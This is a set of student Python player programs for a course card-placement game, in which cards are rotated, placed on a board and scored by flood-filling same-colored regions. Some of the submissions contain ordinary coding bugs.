def possibleNeighbors(matrix, node):
    if node[0] - 1 < 0:
        up = None
    else:
        up = (node[0] - 1, node[1])
    if node[0] >= len(matrix) - 1:
        down = None
    else:
        down = (node[0] + 1, node[1])
    if node[1] - 1 < 0:
        left = None
    else:
        left = (node[0], node[1] - 1)
    if node[1] >= len(matrix[0]) - 1:
        right = None
    else:
        right = (node[0], node[1] + 1)
    return up, down, left, right
        
#traces a connected component (of one color) from a starting position using bfs
def traceComponent(matrix, start, beenCounted):
    color = matrix[start[0]][start[1]]
    #if color of node is 0 ends the function
    if color == 0 or beenCounted[start[0]][start[1]] == True:
        return 0, beenCounted
    
    #bfs for same color
    qeue = [start]
    component = [start]
    known = [row[:] for row in beenCounted]
    known[start[0]][start[1]] = True
    while qeue:
        node = qeue.pop(0)
        neighbors = possibleNeighbors(matrix, node)
        for neighbor in neighbors:
            if neighbor == None:
                continue
            if known[neighbor[0]][neighbor[1]] == False and matrix[neighbor[0]][neighbor[1]] == color:
                qeue.append(neighbor)
                known[neighbor[0]][neighbor[1]] = True
                component.append(neighbor)
            elif known[neighbor[0]][neighbor[1]] == False:
                known[neighbor[0]][neighbor[1]] = True

    #printComponent(component, (len(matrix), len(matrix[0]))) #debug
    for cell in component:
        beenCounted[cell[0]][cell[1]] = True
    return len(component), beenCounted #points for the component, matrix of already counted color points 

                
def neighborHasSameColor(matrix, start, direction): #check if the neighbor has the same color and tracing can begin
    if direction == "up":
        if matrix[start[0] - 1][start[1]] == matrix[start[0]][start[1]]:
            return True
    if direction == "down":
        if matrix[start[0] + 1][start[1]] == matrix[start[0]][start[1]]:
            return True
    if direction == "left":
        if matrix[start[0]][start[1] - 1] == matrix[start[0]][start[1]]:
            return True
    if direction == "right":
        if matrix[start[0]][start[1] + 1] == matrix[start[0]][start[1]]:
            return True
    return False

#<Helping functions/>
########

#class of a playing cards, used to keep track of matrix, placement, doing rotations, checking for validity of moves
class Card:
    def __init__(self, matrix):
        self.matrix = matrix
        self.row = 0
        self.column = 0
        self.height = len(matrix)
        self.width = len(matrix[0])

    def rotate(self): #rotate the card
        rotatedMatrix = list(zip(*self.matrix[::-1]))
        self.matrix = [list(row) for row in rotatedMatrix]
        self.height, self.width = self.width, self.height
    
    def checkForSpace(self, field, row, column): #check if the card fits in the field
        for i in range(self.height):
            for j in range(self.width):
                if row + i >= field.size[0] or column + j >= field.size[1]:
                    return False
                elif field.matrix[row + i][column + j] != -1:
                    return False
        return True
    
    def isValidMove(self, field, row, column): #check if the card is touching any other card
        directions = []
        for i in range(self.height):
            if row + i >= field.size[0]:
                break
            widerThanFieldR = (column + self.width >= field.size[1])
            widerThanFieldL = (column - 1 <= -1)
            if not widerThanFieldL:
                if field.matrix[row + i][column - 1] != -1:
                    if "left" not in directions:
                        directions.append("left")
            if not widerThanFieldR:
                if field.matrix[row + i][column + self.width] != -1:
                    if "right" not in directions:
                        directions.append("right")
        
        tallerThanField = (row - 1 <= -1)
        lowerThanField = (row + self.height >= field.size[0])
        allMinusOne = [-1 for _ in range(self.width)]
        if not tallerThanField:
            if field.matrix[row - 1][column:(column + self.width)] != allMinusOne:
                directions.append("up")
        if not lowerThanField:
            if field.matrix[row + self.height][column:(column + self.width)] != allMinusOne:
                directions.append("down")
        
        if directions == []:
            return directions, False
        return directions, True
    
    def print(self): #print the card in the required format for BRUTE
        rtrnString = ""
        rtrnString += str(self.row) + " " + str(self.column) + " "
        rtrnString += str(self.height) + " " + str(self.width)
        for row in self.matrix:
            for cell in row:
                rtrnString += " " + str(cell)
        return rtrnString
                
#keeps track of placed cards onto the field matrix, cards can be added or removed 
class Field:
    def __init__(self, size):
        self.size = size
        self.addedCardsCount = 0
        self.addedCards = [] #not currently implemented 
        self.matrix = [[-1 for _ in range(size[1])] for _ in range(size[0])]
    
    def add_card(self, card, row, column):
        for i in range(card.height):
            for j in range(card.width):
                self.matrix[row + i][column + j] = card.matrix[i][j]
        self.addedCardsCount += 1
    
    def remove_card(self, card, row, column):
        for i in range(card.height):
            for j in range(card.width):
                self.matrix[row + i][column + j] = -1
        
        self.addedCardsCount -= 1
                
#evalute best placement for avaiable cards 
def bestPlacement(avCards, field):
    hasSolution = False
    addedCard = None
    maxPoints = 0
    cardIndex = 0

    for card in avCards:
        for row in range(field.size[0]):
            for column in range(field.size[1]):
                for n in range(4): #try all 4 rotations 
                    hasSpace = card.checkForSpace(field, row, column)
                    directions, isValid = card.isValidMove(field, row, column)
                    if hasSpace and isValid:
                        currentPoints = 0
                        field.add_card(card, row, column)
                        #debugPrint(field.matrix) #debug
                        beenCounted = [[False for _ in range(field.size[1])] for _ in range(field.size[0])]
                        for direction in directions:
                            if direction == "up":
                                for i in range(card.width):
                                    if neighborHasSameColor(field.matrix, (row, column + i), direction):
                                        points, beenCounted = traceComponent(field.matrix, (row, column + i), beenCounted)
                                        currentPoints += points
                                        #print((row - 1, column + i), points) #debug
                            if direction == "down":
                                for i in range(card.width):
                                    if neighborHasSameColor(field.matrix, (row + card.height - 1, column + i), direction):
                                        points, beenCounted = traceComponent(field.matrix, (row + card.height - 1, column + i), beenCounted)
                                        currentPoints += points
                                        #print((row + card.height, column + i), points) #debug
                            if direction == "left":
                                for i in range(card.height):
                                    if neighborHasSameColor(field.matrix, (row + i, column), direction):
                                        points, beenCounted = traceComponent(field.matrix, (row + i, column), beenCounted)
                                        currentPoints += points
                                        #print((row + i, column - 1), points)  #debug
                            if direction == "right":
                                for i in range(card.height):
                                    if neighborHasSameColor(field.matrix, (row + i, column + card.width - 1), direction):
                                        points, beenCounted = traceComponent(field.matrix, (row + i, column + card.width - 1), beenCounted)
                                        currentPoints += points
                                        #print((row + i, column + card.width), points) #debug
                        if currentPoints > maxPoints:
                            maxPoints = currentPoints
                            card.row = row
                            card.column = column
                            addedCard = deepcopy(card)
                            addedCardIndex = cardIndex
                            #print(currentPoints)
                        #print(currentPoints)
                        field.remove_card(card, row, column)
                    directions = []
                    card.rotate()
    cardIndex += 1
    
    avCards.pop(addedCardIndex)
    return addedCard, avCards



class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Asteroid Destroyer"
        self.field = Field((boardRows, boardCols))
        self.avCards = []
        for item in cardsAtHand:
            card = Card(item)
            self.avCards.append(card)

    def play(self,newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """

        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made
        #the following code DOES NOT provides correct moves, 
        #it just return random card at random position

        if len(newCardOnDesk) == 3:
            #add played card by the othe player to the field
            newCard = Card(newCardOnDesk[2])
            newCard.column = newCardOnDesk[1]
            newCard.row = newCardOnDesk[0]
            self.field.add_card(newCard, newCard.row, newCard.column)           

        if len(self.avCards) == 0:
            return []

        elif self.field.addedCardsCount == 0:
            cardIndex = random.randint(0, len(self.avCards) - 1)
            move = self.avCards.pop(cardIndex)
            moveRow = (self.boardRows // 2) - (move.height // 2)
            moveColumn = (self.boardCols // 2) - (move.width // 2)
            while moveRow > (self.boardRows - move.height - 1):
                moveRow -= 1
                if moveRow == 0:
                    break
            while moveColumn > (self.boardCols - move.width - 1):
                moveRow -= 1
                if moveRow == 0:
                    break
            
            move.row = moveRow
            move.column = moveColumn
        
            self.field.add_card(move, move.column, move.row)
            
            return [move.row, move.row, move.matrix]
        
        else:
            move, self.avCards = bestPlacement(self.avCards, self.field)
            self.field.add_card(move, move.row, move.column)
            return [move.row, move.row, move.matrix]


if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


    tranmanh
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/tranmanh______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from collections import Counter 
from PIL import Image, ImageDraw

class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Musollini"
        self.gameStart = False

    def rotace(self, karta):

        return [list(row) for row in zip(*karta[::-1])]
    
    def kontrola_prostoru(self, hraci_deska, r, s, karta):
    
        radky, sloupce = len(karta), len(karta[0])
    
        for i in range(radky):
            for j in range(sloupce):
                if karta[i][j] != 'X':  
                    if not (0 <= r + i < len(hraci_deska) and 0 <= s + j < len(hraci_deska[0])):  #Prekroceni hran
                        return False
                    if hraci_deska[r + i][s + j] != 'X':  
                        return False
    
        return True
    
    def kontrola_okoli(self, hraci_deska, r, s, karta):
    
        radky, sloupce = len(karta), len(karta[0])
        smery = [(-1, 0), (1, 0), (0, -1), (0, 1)]  #nahoru, dolu, vlevo, vpravo
    
        for i in range(radky):
            for j in range(sloupce):
                if karta[i][j] != 'X':  
                    for nahoru_dolu, doleva_doprava in smery:  
                        novy_r = r + i + nahoru_dolu
                        novy_s = s + j + doleva_doprava
                        if 0 <= novy_r < len(hraci_deska) and 0 <= novy_s < len(hraci_deska[0]) and not (0 <= i + nahoru_dolu < radky and 0 <= j + doleva_doprava < sloupce):
                                if hraci_deska[novy_r][novy_s] != 'X' and hraci_deska[novy_r][novy_s] != 0:
                                    if hraci_deska[novy_r][novy_s] == karta[i][j]: 
                                        return True
                                    
        return False
    

    def pozice_umisteni(self, hraci_deska, r, s, karta):

        radky, sloupce = len(karta), len(karta[0])
        smery = [(-1, 0), (1, 0), (0, -1), (0, 1)]  #nahoru, dolu, vlevo, vpravo
        nove_pozice = []
        for i in range(radky):
            for j in range(sloupce):
                if karta[i][j] != 'X':  
                    for nahoru_dolu, doleva_doprava in smery: #nove souradnice
                        novy_r = r + i + nahoru_dolu 
                        novy_s = s + j + doleva_doprava
                        if 0 <= novy_r < len(hraci_deska) and 0 <= novy_s < len(hraci_deska[0]) and not (0 <= i + nahoru_dolu < radky and 0 <= j + doleva_doprava < sloupce): #kontrola sousednosti jen mimo kartu
                                if hraci_deska[novy_r][novy_s] != 'X' and hraci_deska[novy_r][novy_s] != 0:
                                    if hraci_deska[novy_r][novy_s] == karta[i][j]:
                                        nove_pozice.append([r+i,s+j])
                                        break

        return nove_pozice
                                    
    def najdi_umisteni(self, hraci_deska, karta):

        umisteni = [] #rekurze
        karta_rot = karta
        for _ in range(4):  #4 rotace

            for r in range(len(hraci_deska) - len(karta_rot) + 1):
                for s in range(len(hraci_deska[0]) - len(karta_rot[0]) + 1):
                    if self.kontrola_prostoru(hraci_deska, r, s, karta_rot) and self.kontrola_okoli(hraci_deska, r, s, karta_rot):
                        return r, s, karta_rot
            karta_rot = self.rotace(karta_rot)

        return None

    def vloz_kartu(self, hraci_deska, r, s, karta):

        for i in range(len(karta)):
            for j in range(len(karta[0])):
                if karta[i][j] != 'X':
                    hraci_deska[r + i][s + j] = karta[i][j]
        
    def fill(self, m, x_in, y_in, target, val):
        if target == val: #slouzi k rychlejsimu ukonceni def
            return

        pole = []
        pole.append((x_in, y_in))

        while len(pole)>0:
            x, y = pole.pop(0)

            if x + 1 < len(m) and m[x + 1][y] == target:
                    pole.append((x + 1, y))
                    m[x+1][y]= val
            if x - 1 >= 0 and m[x - 1][y] == target:
                    pole.append((x - 1, y))
                    m[x-1][y]= val
            if y + 1 < len(m[0]) and m[x][y + 1] == target:
                    pole.append((x, y + 1))
                    m[x][y+1]= val
            if y - 1 >= 0 and m[x][y - 1] == target:
                    pole.append((x, y - 1))
                    m[x][y-1]= val

    def soucet(self, hraci_deska): # pocet '_'

        counter = Counter()
        for row in hraci_deska:
            for j in row:
                counter[j]+=1
        return counter['_']

    def poloz_kamkoliv (self, hraci_deska, karta):

        umisteni = [] #rekurze
        karta_rot = karta
        for _ in range(2):  #2 rotace
            karta_rot = self.rotace(karta_rot)
            for r in range(len(hraci_deska) - len(karta_rot) + 1):
                for s in range(len(hraci_deska[0]) - len(karta_rot[0]) + 1):
                    if self.kontrola_prostoru(hraci_deska, r, s, karta_rot) and self.kontrola_libov_okoli(hraci_deska, r, s, karta_rot):
                        umisteni.append((r, s, karta_rot))

        return umisteni

    def kontrola_libov_okoli(self, hraci_deska, r, s, karta):
    
        radky, sloupce = len(karta), len(karta[0])
        smery = [(-1, 0), (1, 0), (0, -1), (0, 1)]  #nahoru, dolu, vlevo, vpravo
    
        for i in range(radky):
            for j in range(sloupce):
                if karta[i][j] != 'X':  
                    for nahoru_dolu, doleva_doprava in smery:  
                        novy_r = r + i + nahoru_dolu
                        novy_s = s + j + doleva_doprava
                        if 0 <= novy_r < len(hraci_deska) and 0 <= novy_s < len(hraci_deska[0]) and not (0 <= i + nahoru_dolu < radky and 0 <= j + doleva_doprava < sloupce):
                            if hraci_deska[novy_r][novy_s] != 'X':
                                return True
                                    
        return False
    
    def play(self,newCardOnDesk):

        if len(newCardOnDesk) == 3:
            self.cardsOnDesk += [ newCardOnDesk ]

        if len(self.cardsAtHand) == 0:
            return []

        #Vytvoreni desky
        hraci_deska = [['X'] * self.boardCols for _ in range(self.boardRows)]
        
        for card in self.cardsOnDesk:
            r, c, karta = card
            self.vloz_kartu(hraci_deska, r, c, karta)

        #Spusti se uplne na zacatku
        if not self.gameStart:
            prazdna_deska = all(c == 'X' for r in hraci_deska for c in r)
            if prazdna_deska:
                    card = self.cardsAtHand.pop(0)
                    self.cardsOnDesk.append([0, 0, card])
                    self.gameStart = True 
                    return [0, 0, card]

        #Hledani best position
        for card in self.cardsAtHand:

            umisteni = self.najdi_umisteni(hraci_deska, card)

            if umisteni:
                r, c, karta_rot = umisteni
                self.cardsAtHand.remove(card)
                self.cardsOnDesk.append([r, c, karta_rot])
                return [r, c, karta_rot]
        
        #polozeni karty bez souseda se stejnou barvou
        while self.cardsAtHand:
            card = self.cardsAtHand.pop(0)
            result = self.poloz_kamkoliv(hraci_deska, card)
            if result:
                for r, c, karta_rot in result:
                    self.cardsOnDesk.append([r, c, karta_rot])
                    return [r, c, karta_rot]

        return []




    bernavo2
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/bernavo2______________________
        player.py
import base as BASE
import copy, random, time, sys, os

class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Parybak"

        self.userLogin = login
        self.boardRows = boardRows
        self.boardCols = boardCols
        self.cardsOnDesk = []
        self.cardsAtHand = cardsAtHand

        freeCards = []
        for card in self.cardsAtHand:
            newCard = []
            newCard.append([len(card), len(card[0])])
            newCard.append(copy.deepcopy(card))
            freeCards.append(newCard)
        self.cardsAtHand = freeCards

        def createRotationsOfCards(freeCards):
            newFreeCards = []
            for card in freeCards:
                newAllRotatedCards = []
                newAllRotatedCards.append(card)
                for i in range(3):
                    Card = newAllRotatedCards[i]
                    newCard = []
                    for x in range(int(Card[0][1]) - 1, 0 - 1, -1):
                        newLine = []
                        for y in range(int(Card[0][0])):
                            newLine.append(Card[1][y][x])
                        newCard.append(newLine)
                    newAllRotatedCards.append([[Card[0][1], Card[0][0]], newCard])
                newFreeCards.append(newAllRotatedCards)
            return newFreeCards
        self.rotatedCardsAtHand = createRotationsOfCards(self.cardsAtHand)

        self.sizeOfBoard = [self.boardRows, self.boardCols]
        def createBoard(sizeOfBoard):
            LooksMaxMatrix = []
            for i in range(int(sizeOfBoard[0])):
                nullMatrixLine = []
                for j in range(int(sizeOfBoard[1])):
                    nullMatrixLine.append(".")
                LooksMaxMatrix.append(nullMatrixLine)
            return LooksMaxMatrix
        self.LMM = createBoard(self.sizeOfBoard)


    def play(self,newCardOnDesk):

        freeCards = []
        for card in self.cardsAtHand:
            newCard = []
            newCard.append([len(card), len(card[0])])
            newCard.append(copy.deepcopy(card))
            freeCards.append(newCard)
        self.cardsAtHand = freeCards

        # - - - - - - - - - - - - FUNCTIONS-MANAGING_INPUT - - - - - - - - - - - -
        def createRotationsOfCards(freeCards):
            newFreeCards = []
            for card in freeCards:
                newAllRotatedCards = []
                newAllRotatedCards.append(card)
                for i in range(3):
                    Card = newAllRotatedCards[i]
                    newCard = []
                    for x in range(int(Card[0][1]) - 1, 0 - 1, -1):
                        newLine = []
                        for y in range(int(Card[0][0])):
                            newLine.append(Card[1][y][x])
                        newCard.append(newLine)
                    newAllRotatedCards.append([[Card[0][1], Card[0][0]], newCard])
                newFreeCards.append(newAllRotatedCards)
            return newFreeCards
        def createLooksMaxMatrix(sizeOfMatrix, laidCards):
            LooksMaxMatrix = []
            for i in range(int(sizeOfMatrix[0])):
                nullMatrixLine = []
                for j in range(int(sizeOfMatrix[1])):
                    nullMatrixLine.append(".")
                LooksMaxMatrix.append(nullMatrixLine)
            for card in laidCards:
                for y in range(int(card[1][0])):
                    for x in range(int(card[1][1])):
                        LooksMaxMatrix[int(card[0][0]) + y][int(card[0][1]) + x] = card[2][y][x]
            return LooksMaxMatrix
        def createMatrixOfSpaces(LooksMaxMatrix):
            MatrixOfSpaces = []
            for y in range(len(LooksMaxMatrix) - 1, 0, -1):
                line_of_numbers = []
                for x in range(len(LooksMaxMatrix[y])):
                    if LooksMaxMatrix[y][x] == ".":
                        if y != len(LooksMaxMatrix) - 1 and MatrixOfSpaces[0][x] != 0:
                            line_of_numbers.append(MatrixOfSpaces[0][x] - 1)
                        else:
                            position = [y, x]
                            count = 0
                            line_of_numbers.append(checkNext(LooksMaxMatrix, position, count))
                    else:
                        line_of_numbers.append(0)
                MatrixOfSpaces = [line_of_numbers] + MatrixOfSpaces[:]
            line_of_numbers = []
            for x in range(len(LooksMaxMatrix[0])):
                if LooksMaxMatrix[0][x] == ".":
                    line_of_numbers.append(1)
                else:
                    line_of_numbers.append(0)
            MatrixOfSpaces = [line_of_numbers] + MatrixOfSpaces[:]
            return MatrixOfSpaces
        def checkNext(matrix, position, count):
            if matrix[position[0]][position[1]] == "." and position[0] != -1:
                position[0] = position[0] - 1
                count += 1
                return checkNext(matrix, position, count)
            else:
                return count

        # - - - - - - - - - - - - FUNCTIONS-GETTING_LOCATIONS - - - - - - - - - - - -
        def findIndexesOfArea(matrix, sizeY, sizeX, indexOfCard, LMM):
            indexes = []
            areLinesCorrect = TouchingSetup(LMM)

            for line in matrix:

                if TouchingOther(matrix.index(line), areLinesCorrect, sizeY, sizeX) is True:

                    temp = getArea(line, sizeY, sizeX)
                    if temp != []:
                        for i in range(len(temp)):
                            if temp[i][1] == False:
                                pos = [matrix.index(line) - sizeY + 1, temp[i][0]]
                                if Touching(matrix, pos, sizeY, sizeX) == True:
                                    indexes.append([matrix.index(line) - sizeY + 1, temp[i][0], False, indexOfCard])
                            elif temp[i][1] == True:
                                pos = [matrix.index(line) - sizeX + 1, temp[i][0]]
                                if Touching(matrix, pos, sizeX, sizeY) == True:
                                    indexes.append([matrix.index(line) - sizeX + 1, temp[i][0], True, indexOfCard])

            return indexes
        def getArea(line, size1, size2):
            n = len(line)
            desiredArea = size1 * size2
            indexes = []
            for i in range(2, n):
                curr = line[i]
                left = i - 1
                while left >= 0:
                    if line[left] >= line[i]:
                        curr += line[i]
                        if curr >= desiredArea and (line[i] >= size1 and (i - left + 1) >= size2):
                            indexes.append([left, False])

                            if size1 != size2 and (line[i] >= size2 and (i - left + 1) >= size1):
                                indexes.append([left, True])

                            break
                        elif curr >= desiredArea and (line[i] >= size2 and (i - left + 1) >= size1):
                            indexes.append([left, True])
                            break
                        left -= 1
                    else:
                        break
            for i in range(n - 3, 0, -1):
                curr = line[i]
                right = i + 1
                while right < n:
                    if line[right] >= line[i]:
                        curr += line[i]
                        if curr >= desiredArea and (line[i] >= size1 and (right - i + 1) >= size2):
                            if [i, False] not in indexes:
                                indexes.append([i, False])

                                if size1 != size2 and (line[i] >= size2 and (right - i + 1) >= size1):
                                    if [i, True] not in indexes:
                                        indexes.append([i, True])

                            break
                        elif curr >= desiredArea and (line[i] >= size2 and (right - i + 1) >= size1):
                            if [i, True] not in indexes:
                                indexes.append([i, True])
                            break
                        right += 1
                    else:
                        break
            return indexes
        def Touching(matrix, index, size1, size2):
            y = index[0]
            x = index[1]
            for i in range(size2):
                if y > 0:
                    if matrix[y - 1][x + i] == 0:
                        return True
                if y + size1 < len(matrix):
                    if matrix[y + size1][x + i] == 0:
                        return True
            for i in range(size1):
                if x > 0:
                    if matrix[y + i][x - 1] == 0:
                        return True
                if x + size2 < len(matrix[0]):
                    if matrix[y + i][x + size2] == 0:
                        return True
            return False
        def TouchingSetup(matrix):
            array = []
            for line in matrix:
                jiriKorn = False
                for char in line:
                    if char != '.':
                        jiriKorn = True
                        break
                array.append(jiriKorn)
            return array
        def TouchingOther(indeks, areLinesCorrect, sizeY, sizeX):
            if indeks < sizeY - 1 and indeks < sizeX - 1:
                return False
            else:
                if areLinesCorrect[indeks] is True:
                    return True
                if indeks + 1 < len(areLinesCorrect):
                    if areLinesCorrect[indeks + 1] is True:
                        return True
                if indeks - sizeY + 1 > 0:
                    for i in range(indeks - sizeY - 1, indeks + 1):
                        if areLinesCorrect[i] is True:
                            return True
                if indeks - sizeX + 1 > 0:
                    for i in range(indeks - sizeX - 1, indeks + 1):
                        if areLinesCorrect[i] is True:
                            return True
                return False

        # - - - - - - - - - - - - FUNCTIONS-EVALUATING_LOCATIONS - - - - - - - - - - - -
        class fronta_flood_fill:
            def __init__(self):
                self.items = []

            def put(self, item):
                if item not in self.items:
                    self.items.append(item)

            def get(self):
                if len(self.items) > 0:
                    return self.items.pop()

            def info(self):
                if len(self.items) > 0:
                    return self.items[-1]

            def isEmpty(self):
                if len(self.items) == 0:
                    return True
                else:
                    return False
        def flood_fill(matrix, limits, pos, char):
            global stack
            if matrix[pos[0]][pos[1]] != '.' and int(matrix[pos[0]][pos[1]]) == char:
                if pos[0] != int(limits[0]) - 1 and matrix[pos[0] + 1][pos[1]] != '.' and int(
                        matrix[pos[0] + 1][pos[1]]) == char and matrix[pos[0] + 1][pos[1]] != 6:
                    stack.put([pos[0] + 1, pos[1]])
                if pos[1] != int(limits[1]) - 1 and matrix[pos[0]][pos[1] + 1] != '.' and int(
                        matrix[pos[0]][pos[1] + 1]) == char and matrix[pos[0]][pos[1] + 1] != 6:
                    stack.put([pos[0], pos[1] + 1])
                if pos[0] != 0 and matrix[pos[0] - 1][pos[1]] != '.' and int(matrix[pos[0] - 1][pos[1]]) == char and \
                        matrix[pos[0] - 1][pos[1]] != 6:
                    stack.put([pos[0] - 1, pos[1]])
                if pos[1] != 0 and matrix[pos[0]][pos[1] - 1] != '.' and int(matrix[pos[0]][pos[1] - 1]) == char and \
                        matrix[pos[0]][pos[1] - 1] != 6:
                    stack.put([pos[0], pos[1] - 1])
                matrix[pos[0]][pos[1]] = 6
        def chooseBestIndex(arrayOfIndexes, LMM):
            global stack
            maximum = 0
            bestIndex = []
            for indexes in arrayOfIndexes:
                for ind in indexes:
                    controlCard = freeCards[ind[3]]

                    if controlCard[0][0] == controlCard[0][1]:
                        arrayOfRotations = [0, 1, 2, 3]
                    elif controlCard[0][0] != controlCard[0][1] and ind[2] is True:
                        arrayOfRotations = [1, 3]
                    else:
                        arrayOfRotations = [0, 2]

                    for rot in arrayOfRotations:
                        tempCard = copy.deepcopy(newFreeCards[ind[3]][rot])

                        maxPoints = 0
                        matrix = putInLMM(LMM, ind, tempCard)
                        tempMatrix = copy.deepcopy(matrix)
                        positions = findConnectablePositions(ind, tempCard, matrix)

                        matrixOfPoints = []
                        for i in range(len(matrix)):
                            newline = []
                            for j in range(len(matrix[0])):
                                newline.append('')
                            matrixOfPoints.append(newline)

                        for pos in positions:
                            points = 0
                            stack = fronta_flood_fill()
                            stack.put(pos)
                            while stack.isEmpty() is False:
                                points += 1
                                flood_fill(matrix, self.sizeOfBoard, stack.get(), int(tempMatrix[pos[0]][pos[1]]))
                            if points > 1:
                                maxPoints += points
                        if maxPoints > maximum:
                            copyind = copy.deepcopy(ind)
                            copyind.append(rot)
                            maximum = maxPoints
                            bestIndex = copyind
            return bestIndex
        def putInLMM(LMM, indeks, Card):
            matrix = copy.deepcopy(LMM)

            for y in range(int(Card[0][0])):
                for x in range(int(Card[0][1])):
                    matrix[y + indeks[0]][x + indeks[1]] = int(Card[1][y][x])

            return matrix
        def findConnectablePositions(Index, Card, Matrix):
            positions = []

            downLenght = int(Card[0][0])
            rightLenght = int(Card[0][1])

            topLeft = int(Card[1][0][0])
            if Index[0] != 0:
                if Matrix[Index[0] - 1][Index[1]] != '.' and int(Matrix[Index[0] - 1][Index[1]]) != 0 and int(
                        Matrix[Index[0] - 1][Index[1]]) == topLeft:
                    positions.append([Index[0] - 1, Index[1]])
            if Index[1] != 0:
                if Matrix[Index[0]][Index[1] - 1] != '.' and int(Matrix[Index[0]][Index[1] - 1]) != 0 and int(
                        Matrix[Index[0]][Index[1] - 1]) == topLeft:
                    positions.append([Index[0], Index[1] - 1])

            topRight = int(Card[1][0][rightLenght - 1])
            if Index[0] != 0:
                if Matrix[Index[0] - 1][Index[1] + rightLenght - 1] != '.' and int(
                        Matrix[Index[0] - 1][Index[1] + rightLenght - 1]) != 0 and int(
                        Matrix[Index[0] - 1][Index[1] + rightLenght - 1]) == topRight:
                    if Matrix[Index[0] - 1][Index[1]] != Matrix[Index[0] - 1][Index[1] + rightLenght - 1]:
                        positions.append([Index[0] - 1, Index[1] + rightLenght - 1])
            if Index[1] != len(Matrix[0]) - rightLenght:
                if Matrix[Index[0]][Index[1] + rightLenght] != '.' and int(
                        Matrix[Index[0]][Index[1] + rightLenght]) != 0 and int(
                        Matrix[Index[0]][Index[1] + rightLenght]) == topRight:
                    positions.append([Index[0], Index[1] + rightLenght])

            downLeft = int(Card[1][downLenght - 1][0])
            if Index[0] != len(Matrix) - downLenght:
                if Matrix[Index[0] + downLenght][Index[1]] != '.' and int(
                        Matrix[Index[0] + downLenght][Index[1]]) != 0 and int(
                        Matrix[Index[0] + downLenght][Index[1]]) == downLeft:
                    positions.append([Index[0] + downLenght, Index[1]])
            if Index[1] != 0:
                if Matrix[Index[0] + downLenght - 1][Index[1] - 1] != '.' and int(
                        Matrix[Index[0] + downLenght - 1][Index[1] - 1]) != 0 and int(
                        Matrix[Index[0] + downLenght - 1][Index[1] - 1]) == downLeft:
                    if Matrix[Index[0]][Index[1] - 1] != Matrix[Index[0] + downLenght - 1][Index[1] - 1]:
                        positions.append([Index[0] + downLenght - 1, Index[1] - 1])

            downRight = int(Card[1][downLenght - 1][rightLenght - 1])
            if Index[0] != len(Matrix) - downLenght:
                if Matrix[Index[0] + downLenght][Index[1] + rightLenght - 1] != '.' and int(
                        Matrix[Index[0] + downLenght][Index[1] + rightLenght - 1]) != 0 and int(
                        Matrix[Index[0] + downLenght][Index[1] + rightLenght - 1]) == downRight:
                    positions.append([Index[0] + downLenght, Index[1] + rightLenght - 1])
            if Index[1] != len(Matrix[0]) - rightLenght:
                if Matrix[Index[0] + downLenght - 1][Index[1] + rightLenght] != '.' and int(
                        Matrix[Index[0] + downLenght - 1][Index[1] + rightLenght]) != 0 and int(
                        Matrix[Index[0] + downLenght - 1][Index[1] + rightLenght]) == downRight:
                    positions.append([Index[0] + downLenght - 1, Index[1] + rightLenght])

            if Index[1] != 0:
                for y in range(1, int(Card[0][0]) - 1):
                    if Matrix[Index[0] + y][Index[1] - 1] != '.' and int(
                            Matrix[Index[0] + y][Index[1] - 1]) != 0 and int(Matrix[Index[0] + y][Index[1] - 1]) == int(
                            Matrix[Index[0] + y][Index[1]]):
                        positions.append([Index[0] + y, Index[1] - 1])

            if Index[1] != len(Matrix[0]) - rightLenght:
                for y in range(1, int(Card[0][0]) - 1):
                    if Matrix[Index[0] + y][Index[1] + rightLenght] != '.' and int(
                            Matrix[Index[0] + y][Index[1] + rightLenght]) != 0 and int(
                            Matrix[Index[0] + y][Index[1] + rightLenght]) == int(
                            Matrix[Index[0] + y][Index[1] + rightLenght - 1]):
                        positions.append([Index[0] + y, Index[1] + rightLenght])

            if Index[0] != 0:
                for x in range(1, int(Card[0][1]) - 1):
                    if Matrix[Index[0] - 1][Index[1] + x] != '.' and int(
                            Matrix[Index[0] - 1][Index[1] + x]) != 0 and int(Matrix[Index[0] - 1][Index[1] + x]) == int(
                            Matrix[Index[0]][Index[1] + x]):
                        positions.append([Index[0] - 1, Index[1] + x])

            if Index[0] != len(Matrix) - downLenght:
                for x in range(1, int(Card[0][1]) - 1):
                    if Matrix[Index[0] + downLenght][Index[1] + x] != '.' and int(
                            Matrix[Index[0] + downLenght][Index[1] + x]) != 0 and int(
                            Matrix[Index[0] + downLenght][Index[1] + x]) == int(
                            Matrix[Index[0] + downLenght - 1][Index[1] + x]):
                        positions.append([Index[0] + downLenght, Index[1] + x])

            return positions
        def simplePut(matrix, indeks, Card):
            for y in range(len(Card)):
                for x in range(len(Card[0])):
